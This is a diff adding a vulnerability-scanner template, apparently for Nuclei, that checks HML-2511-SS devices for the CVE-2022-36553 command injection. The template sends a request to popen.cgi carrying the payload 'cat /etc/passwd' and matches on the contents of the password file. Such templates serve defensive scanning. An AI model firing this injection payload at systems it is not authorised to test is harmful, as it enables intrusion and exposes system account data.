@@ -1,0 +1,28 @@
+id: cve-2022-36553-command-injection
+info:
+  name: HML-2511-SS Command Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: cve, command-injection
+  description: |
+    HML-2511-SS v1.05 is vulnerable to a command injection vulnerability (CVE-2022-36553). This template checks for the vulnerability by attempting to execute a command to read `/etc/passwd`.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/popen.cgi?command=cat%20/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
